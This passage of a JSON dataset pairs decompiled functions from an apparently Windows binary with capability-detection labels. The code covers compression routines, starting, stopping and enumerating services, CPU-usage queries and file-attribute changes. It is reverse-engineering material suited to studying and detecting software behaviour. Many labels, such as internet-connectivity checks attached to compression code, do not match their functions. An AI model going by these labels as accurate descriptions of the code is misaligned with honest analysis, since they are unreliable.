iVar10 + 1;\n        fcn.0046b294();\n    } while (1 < *(in_EAX + 0x144c));\n    *(in_EAX + 0x1450) = *(in_EAX + 0x1450) + -1;\n    *(in_EAX + 0xb58 + *(in_EAX + 0x1450) * 4) = *(in_EAX + 0xb5c);\n    fcn.0046b388();\n    fcn.0046b588();\n    return;\n}\n",
        "token_count": 1308
    },
    "0046bf9c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046bf9c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint8_t *puVar2;\n    \n    fcn.0046b808();\n    fcn.0046b808();\n    fcn.0046b5f8();\n    iVar1 = 0x12;\n    puVar2 = 0x494eca;\n    do {\n        if (*(in_EAX + 0xa7a + *puVar2 * 4) != 0) break;\n        iVar1 = iVar1 + -1;\n        puVar2 = puVar2 + -1;\n    } while (2 < iVar1);\n    *(in_EAX + 0x16a4) = *(in_EAX + 0x16a4) + iVar1 * 3 + 0x11;\n    return;\n}\n",
        "token_count": 190
    },
    "0046c958": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046c958(int32_t param_1, int32_t param_2)\n\n{\n    uint8_t uVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t in_EAX;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int16_t iVar8;\n    uint32_t uVar9;\n    uint32_t uStack32;\n    \n    uStack32 = 0;\n    if (*(in_EAX + 0x169c) != 0) {\n        do {\n            uVar7 = *(*(in_EAX + 0x16a0) + uStack32 * 2);\n            uVar9 = *(*(in_EAX + 0x1694) + uStack32);\n            uStack32 = uStack32 + 1;\n            if (uVar7 == 0) {\n                uVar7 = *(param_2 + 2 + uVar9 * 4);\n                if (0x10 - uVar7 < *(in_EAX + 0x16b8)) {\n                    uVar2 = *(param_2 + uVar9 * 4);\n                    *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar2 << (*(in_EAX + 0x16b8) & 0x1f);\n                    iVar3 = *(in_EAX + 0x14);\n                    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                    *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4);\n                    iVar3 = *(in_EAX + 0x14);\n                    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                    *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4) >> 8;\n                    *(in_EAX + 0x16b4) = uVar2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                    *(in_EAX + 0x16b8) = (uVar7 - 0x10) + *(in_EAX + 0x16b8);\n                }\n                else {\n                    *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *(param_2 + uVar9 * 4) << (*(in_EAX + 0x16b8) & 0x1f);\n                    *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar7;\n                }\n            }\n            else {\n                uVar6 = *(uVar9 + 0x4950cb);\n                uVar5 = *(param_2 + 0x406 + uVar6 * 4);\n                if (0x10 - uVar5 < *(in_EAX + 0x16b8)) {\n                    uVar2 = *(param_2 + 0x404 + uVar6 * 4);\n                    *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar2 << (*(in_EAX + 0x16b8) & 0x1f);\n                    iVar3 = *(in_EAX + 0x14);\n                    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                    *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4);\n                    iVar3 = *(in_EAX + 0x14);\n                    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                    *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4) >> 8;\n                    *(in_EAX + 0x16b4) = uVar2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                    *(in_EAX + 0x16b8) = (uVar5 - 0x10) + *(in_EAX + 0x16b8);\n                }\n                else {\n                    *(in_EAX + 0x16b4) =\n                         *(in_EAX + 0x16b4) | *(param_2 + 0x404 + uVar6 * 4) << (*(in_EAX + 0x16b8) & 0x1f);\n                    *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar5;\n                }\n                iVar3 = *(uVar6 * 4 + 0x494760);\n                if (iVar3 != 0) {\n                    uVar9 = uVar9 - *(uVar6 * 4 + 0x494d90);\n                    iVar8 = uVar9;\n                    if (0x10 - iVar3 < *(in_EAX + 0x16b8)) {\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar8 << (*(in_EAX + 0x16b8) & 0x1f);\n                        iVar4 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4);\n                        iVar4 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4) >> 8;\n                        *(in_EAX + 0x16b4) = (uVar9 & 0xffff) >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = iVar3 + -0x10 + *(in_EAX + 0x16b8);\n                    }\n                    else {\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar8 << (*(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + iVar3;\n                    }\n                }\n                uVar9 = uVar7 - 1;\n                if (uVar9 < 0x100) {\n                    uVar1 = *(uVar7 + 0x494eca);\n                }\n                else {\n                    uVar1 = *((uVar9 >> 7) + 0x494fcb);\n                }\n                uVar7 = uVar1;\n                uVar5 = *(param_1 + 2 + uVar7 * 4);\n                if (0x10 - uVar5 < *(in_EAX + 0x16b8)) {\n                    uVar2 = *(param_1 + uVar7 * 4);\n                    *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar2 << (*(in_EAX + 0x16b8) & 0x1f);\n                    iVar3 = *(in_EAX + 0x14);\n                    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                    *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4);\n                    iVar3 = *(in_EAX + 0x14);\n                    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                    *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4) >> 8;\n                    *(in_EAX + 0x16b4) = uVar2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                    *(in_EAX + 0x16b8) = (uVar5 - 0x10) + *(in_EAX + 0x16b8);\n                }\n                else {\n                    *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *(param_1 + uVar7 * 4) << (*(in_EAX + 0x16b8) & 0x1f);\n                    *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar5;\n                }\n                iVar3 = *(uVar7 * 4 + 0x4947d4);\n                if (iVar3 != 0) {\n                    uVar9 = uVar9 - *(uVar7 * 4 + 0x494e04);\n                    iVar8 = uVar9;\n                    if (0x10 - iVar3 < *(in_EAX + 0x16b8)) {\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar8 << (*(in_EAX + 0x16b8) & 0x1f);\n                        iVar4 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4);\n                        iVar4 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4) >> 8;\n                        *(in_EAX + 0x16b4) = (uVar9 & 0xffff) >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = iVar3 + -0x10 + *(in_EAX + 0x16b8);\n                    }\n                    else {\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar8 << (*(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + iVar3;\n                    }\n                }\n            }\n        } while (uStack32 < *(in_EAX + 0x169c));\n    }\n    uVar7 = *(param_2 + 0x402);\n    if (0x10 - uVar7 < *(in_EAX + 0x16b8)) {\n        uVar2 = *(param_2 + 0x400);\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar2 << (*(in_EAX + 0x16b8) & 0x1f);\n        iVar3 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4);\n        iVar3 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = uVar2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = (uVar7 - 0x10) + *(in_EAX + 0x16b8);\n    }\n    else {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *(param_2 + 0x400) << (*(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar7;\n    }\n    *(in_EAX + 0x16b0) = *(param_2 + 0x402);\n    return;\n}\n",
        "token_count": 2955
    },
    "0046ce18": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046ce18(void)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    piVar1 = in_EAX + 0x24;\n    do {\n        if (*piVar1 != 0) break;\n        iVar2 = iVar2 + 1;\n        piVar1 = piVar1 + 1;\n    } while (iVar2 < 9);\n    if (iVar2 == 9) {\n        iVar2 = 0xe;\n        piVar1 = in_EAX + 0x32;\n        do {\n            if (*piVar1 != 0) break;\n            iVar2 = iVar2 + 1;\n            piVar1 = piVar1 + 1;\n        } while (iVar2 < 0x20);\n    }\n    *(*in_EAX + 0x2c) = iVar2 == 0x20;\n    return;\n}\n",
        "token_count": 214
    },
    "0046cef4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046cef4(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x16b8) < 9) {\n        if (0 < *(in_EAX + 0x16b8)) {\n            iVar1 = *(in_EAX + 0x14);\n            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n            *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n        }\n    }\n    else {\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4) >> 8;\n    }\n    *(in_EAX + 0x16b4) = 0;\n    *(in_EAX + 0x16b8) = 0;\n    return;\n}\n",
        "token_count": 317
    },
    "0046cf5c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046cf5c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    uchar *in_EDX;\n    \n    fcn.0046cef4();\n    *(in_EAX + 0x16b0) = 8;\n    if (arg_8h != 0) {\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = in_ECX;\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = in_ECX >> 8;\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = ~in_ECX;\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = ~in_ECX >> 8;\n    }\n    while (in_ECX != 0) {\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *in_EDX;\n        in_EDX = in_EDX + 1;\n        in_ECX = in_ECX + -1;\n    }\n    return;\n}\n",
        "token_count": 437
    },
    "0046d164": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0046d164(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t auStack164 [3];\n    int32_t iStack152;\n    \n    fcn.00403af4();\n    auStack164[0] = 0x94;\n    iVar1 = sub.kernel32.dll_GetVersionExA(auStack164);\n    if (((iVar1 != 0) && (iStack152 == 2)) && (5 < auStack164[0])) {\n        iVar1 = sub.kernel32.dll_LoadLibraryA(0x46d1f0);\n        if (iVar1 != 0) {\n            iVar3 = iVar1;\n            pcVar2 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x46d1fc);\n            if (pcVar2 != NULL) {\n                if (iVar3 == '\\0') {\n                    (*pcVar2)(0);\n                }\n                else {\n                    (*pcVar2)(1);\n                }\n            }\n        }\n        sub.kernel32.dll_FreeLibrary_1(iVar1);\n    }\n    return 0;\n}\n",
        "token_count": 250
    },
    "0046dd8c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046dd8c(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack84;\n    uint uStack80;\n    uchar *puStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint lpServiceStatus;\n    int32_t hSCManager;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = 0x46dda1;\n    var_8h = param_2;\n    fcn.004059cc();\n    puStack52 = 0x46dda9;\n    fcn.004059cc();\n    uStack56 = 0x46de47;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    uStack64 = 0xf003f;\n    uStack68 = 0;\n    uStack72 = 0x46ddc6;\n    puStack52 = &stack0xfffffffc;\n    uStack72 = fcn.004059dc();\n    puStack76 = 0x46ddcc;\n    hSCManager = sub.advapi32.dll_OpenSCManagerA();\n    if (hSCManager != 0) {\n        uStack80 = 0x46de25;\n        uStack84 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffac;\n        puStack76 = &stack0xfffffffc;\n        uVar1 = fcn.004059dc(0xf01ff);\n        uVar1 = sub.advapi32.dll_OpenServiceA(hSCManager, uVar1);\n        sub.advapi32.dll_ControlService(uVar1, 1, &fcn.0046dd8c::lpServiceStatus);\n        sub.advapi32.dll_CloseServiceHandle();\n        *in_FS_OFFSET = uVar1;\n        sub.advapi32.dll_CloseServiceHandle(hSCManager, 0x46de2c);\n        return;\n    }\n    *in_FS_OFFSET = uStack72;\n    uStack64 = 0x46de4e;\n    uStack68 = 0x46de46;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 503
    },
    "0046de54": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046de54(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    int32_t hSCManager;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x46de69;\n    var_8h = param_2;\n    fcn.004059cc();\n    puStack28 = 0x46de71;\n    fcn.004059cc();\n    uStack32 = 0x46df14;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack40 = 0xf003f;\n    uStack44 = 0;\n    uStack48 = 0x46de8e;\n    puStack28 = &stack0xfffffffc;\n    uStack48 = fcn.004059dc();\n    puStack52 = 0x46de94;\n    hSCManager = sub.advapi32.dll_OpenSCManagerA();\n    if (hSCManager != 0) {\n        uStack56 = 0x46def2;\n        uStack60 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc4;\n        puStack52 = &stack0xfffffffc;\n        uVar1 = fcn.004059dc(0xf01ff);\n        uVar1 = sub.advapi32.dll_OpenServiceA(hSCManager, uVar1);\n        var_10h = 0;\n        sub.advapi32.dll_StartServiceA(uVar1, 0, &fcn.0046de54::var_10h);\n        sub.advapi32.dll_CloseServiceHandle();\n        *in_FS_OFFSET = uVar1;\n        sub.advapi32.dll_CloseServiceHandle(hSCManager, 0x46def9);\n        return;\n    }\n    *in_FS_OFFSET = uStack48;\n    uStack40 = 0x46df1b;\n    uStack44 = 0x46df13;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 512
    },
    "0046e6cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0046e6cc(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    uint uStack444;\n    uchar *puStack440;\n    uint uStack436;\n    uint uStack432;\n    uint uStack428;\n    uchar *puStack424;\n    uint uStack420;\n    uint uStack416;\n    uint32_t uStack140;\n    int32_t iStack136;\n    uchar auStack116 [40];\n    uint8_t uStack76;\n    int32_t iStack72;\n    uchar *puStack68;\n    int32_t iStack64;\n    int32_t iStack60;\n    uint32_t uStack56;\n    \n    uVar2 = 0;\n    uStack416 = 0;\n    uStack420 = 0x2c;\n    puStack424 = &stack0xffffffbc;\n    uStack428 = 0;\n    uStack432 = 0x46e6e8;\n    iVar1 = sub.ntdll.dll_NtQuerySystemInformation();\n    if (iVar1 == 0) {\n        uStack432 = 0;\n        uStack436 = 0x20;\n        puStack440 = &stack0xffffff8c;\n        puVar4 = &stack0xfffffe44;\n        uStack444 = 3;\n        iVar1 = sub.ntdll.dll_NtQuerySystemInformation();\n        if (iVar1 == 0) {\n            uVar3 = 2;\n            iVar1 = sub.ntdll.dll_NtQuerySystemInformation(2, &stack0xfffffe44, 0x138, 0);\n            if (iVar1 == 0) {\n                if (*0x495218 != NULL || *0x495214 != 0) {\n                    iStack72 = uVar3 - *0x495214;\n                    puStack68 = puVar4 + (-(uVar3 < *0x495214) - *0x495218);\n                    iStack64 = uStack140 - *0x49521c;\n                    iStack60 = (iStack136 - *0x495220) - (uStack140 < *0x49521c);\n                    uStack56 = uStack76;\n                    *0x495224 = fcn.0040345c();\n                    if (*0x495218 != NULL || *0x495224 != *0x495214) {\n                        uVar2 = *0x495224;\n                    }\n                }\n                *0x495218 = puVar4;\n                *0x495214 = uVar3;\n                *0x49521c = uStack140;\n                *0x495220 = iStack136;\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 602
    },
    "00470cb0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00470cb0(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_fffffeb8;\n    uint uVar5;\n    int32_t iStack304;\n    uint uStack300;\n    uchar *puStack296;\n    uint var_114h;\n    uint lpszFile;\n    uint hDrop;\n    uint hMem;\n    \n    puStack296 = &stack0xfffffffc;\n    uStack300 = 0x470d90;\n    iStack304 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack304;\n    fcn.00405530();\n    fcn.00431a18();\n    iVar1 = fcn.0043190c();\n    if (iVar1 != 0) {\n        uVar2 = sub.kernel32.dll_GlobalLock(iVar1);\n        uVar5 = uVar2;\n        iVar3 = sub.shell32.dll_DragQueryFileA(uVar2, 0xffffffff, 0, 0);\n        if (-1 < iVar3 + -1) {\n            do {\n                uVar5 = uVar2;\n                sub.shell32.dll_DragQueryFileA();\n                iVar4 = fcn.0040a870();\n                if (iVar4 != 0) {\n                    fcn.00405728(*in_EAX);\n                    uVar5 = 0x470da8;\n                    fcn.004058e0();\n                }\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        sub.kernel32.dll_GlobalUnlock(iVar1, uVar5);\n        in_stack_fffffeb8 = iVar1;\n    }\n    *in_FS_OFFSET = in_stack_fffffeb8;\n    fcn.00405530(0x470d97);\n    return;\n}\n",
        "token_count": 424
    },
    "0047175c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047175c(void)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    char **ppcVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    bool bVar5;\n    uint uStackY18476;\n    uint uStackY18472;\n    uchar *puStackY18468;\n    uint *puStackY18464;\n    uint *puStackY18460;\n    char *apcStackY18456 [3048];\n    uint uStackY6264;\n    uint uStackY6256;\n    uint uStackY6252;\n    uchar *puStackY6248;\n    uint uStackY6244;\n    uint *puStackY6240;\n    uint *puStackY6236;\n    uint *puStackY6232;\n    int32_t iStackY6228;\n    uint uStackY6224;\n    uchar *arg_8h;\n    int32_t iStack6216;\n    uint uStack6212;\n    uchar *puStack6208;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t hSCManager;\n    int32_t *var_4h;\n    \n    puStack6208 = &stack0xfffffffc;\n    piVar1 = 0x4;\n    do {\n        piVar2 = piVar1;\n        piVar1 = piVar2 + -1;\n    } while (piVar2 + -1 != NULL);\n    uStackY18476 = 0;\n    puStackY18468 = NULL;\n    uStackY18472 = 0;\n    puStackY18464 = NULL;\n    puStackY18460 = NULL;\n    uStack6212 = 0x471944;\n    iStack6216 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffe7b8;\n    var_4h = piVar2;\n    fcn.00405530();\n    uStackY6224 = 0;\n    iStackY6228 = 0;\n    puStackY6232 = 0x4717c3;\n    hSCManager = sub.advapi32.dll_OpenSCManagerA();\n    if (hSCManager != 0) {\n        var_14h = 0;\n        do {\n            puStackY6232 = &fcn.0047175c::var_14h;\n            puStackY6236 = &fcn.0047175c::var_10h;\n            puStackY6240 = &fcn.0047175c::var_ch;\n            uStackY6244 = 0x4800;\n            puStackY6248 = &stack0xffffb7e8;\n            uStackY6252 = 3;\n            uStackY6256 = 0x13f;\n            iStackY6228 = hSCManager;\n            uStackY6264 = 0x4717fd;\n            sub.advapi32.dll_EnumServicesStatusA();\n            if (-1 < var_10h + -1) {\n                ppcVar3 = &stack0xffffb7e8;\n                iVar4 = var_10h;\n                do {\n                    bVar5 = *ppcVar3 == NULL;\n                    if (!bVar5) {\n                        bVar5 = **ppcVar3 == '\\0';\n                    }\n                    if (bVar5) {\n                        puStackY6232 = 0x471827;\n                        fcn.00405818();\n                    }\n                    else {\n                        puStackY6232 = *piVar2;\n                        puStackY6236 = 0x471838;\n                        fcn.00405728();\n                        puStackY6236 = puStackY18460;\n                        puStackY6240 = 0x47195c;\n                        uStackY6244 = 0x47184f;\n                        fcn.004058e0();\n                    }\n                    bVar5 = ppcVar3[1] == NULL;\n                    if (!bVar5) {\n                        bVar5 = *ppcVar3[1] == '\\0';\n                    }\n                    if (bVar5) {\n                        puStackY6232 = 0x471867;\n                        fcn.00405818();\n                    }\n                    else {\n                        puStackY6232 = *piVar2;\n                        puStackY6236 = 0x471879;\n                        fcn.00405728();\n                        puStackY6236 = puStackY18464;\n                        puStackY6240 = 0x47195c;\n                        uStackY6244 = 0x471890;\n                        fcn.004058e0();\n                    }\n                    puStack6208 = 0x47189f;\n                    fcn.00405728();\n                    puStack6208 = 0x4718b0;\n                    fcn.004713c0();\n                    puStack6208 = puStackY18468;\n                    uStack6212 = 0x47195c;\n                    iStack6216 = 0x4718c7;\n                    fcn.004058e0();\n                    iStack6216 = *piVar2;\n                    arg_8h = &stack0xffffb7d4;\n                    uStackY6224 = 0x4718dd;\n                    fcn.00405728();\n                    uStackY6224 = 0x4718ec;\n                    fcn.004715d4(arg_8h);\n                    uStackY6224 = uStackY18476;\n                    iStackY6228 = 0x471968;\n                    puStackY6232 = 0x471903;\n                    fcn.004058e0();\n                    ppcVar3 = ppcVar3 + 9;\n                    iVar4 = iVar4 + -1;\n                } while (iVar4 != 0);\n            }\n        } while (var_ch != 0);\n        if (hSCManager != 0) {\n            iStackY6228 = hSCManager;\n            puStackY6236 = 0x471926;\n            sub.advapi32.dll_CloseServiceHandle();\n        }\n    }\n    *in_FS_OFFSET = iStackY6228;\n    uStackY6224 = 0x471943;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1362
    },
    "00472af8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00472af8(uint param_1, char param_2)\n\n{\n    char cVar1;\n    uint32_t arg_ch;\n    uint32_t uVar2;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack560;\n    uint32_t uStack556;\n    uchar *puStack552;\n    uint32_t uStack532;\n    uint uStack528;\n    uchar *puStack524;\n    uint32_t uStack520;\n    uint uStack516;\n    uchar *puStack512;\n    uint var_1ech;\n    uint var_1e8h;\n    uint var_1e4h;\n    uint var_1e0h;\n    uint var_1dch;\n    char var_dh;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack524 = &stack0xfffffffc;\n    var_1e8h = 0;\n    var_1e4h = 0;\n    var_1e0h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    puStack512 = 0x472b32;\n    var_dh = param_2;\n    fcn.004059cc();\n    uStack516 = 0x472d2e;\n    uStack520 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffdf8;\n    uStack528 = 0x472cf2;\n    uStack532 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffdec;\n    puStack512 = &stack0xfffffffc;\n    fcn.00405530();\n    fcn.00471ae4();\n    fcn.00405818();\n    fcn.00403770();\n    fcn.0040ef4c(&fcn.00472af8::var_1e4h, *0x472d58);\n    fcn.004055c8();\n    arg_ch = *0x472d58;\n    puStack552 = 0x472bd2;\n    fcn.0040ef4c(&fcn.00472af8::var_1e8h, arg_ch);\n    puStack552 = 0x472be0;\n    fcn.004055c8();\n    uStack556 = 0x472c29;\n    uStack560 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffdd0;\n    puStack552 = &stack0xfffffffc;\n    fcn.00471ae4(0x80);\n    fcn.00405818();\n    uVar2 = fcn.004059dc();\n    sub.kernel32.dll_SetFileAttributesA();\n    *in_FS_OFFSET = uVar2;\n    if (var_dh != '\\0') {\n        uStack560 = 0x472c44;\n        fcn.004034f4();\n        uStack560 = 0x472c49;\n        fcn.0040305c();\n        while( true ) {\n            uStack560 = 0x472c8c;\n            fcn.00403abc();\n            uStack560 = 0x472c91;\n            cVar1 = 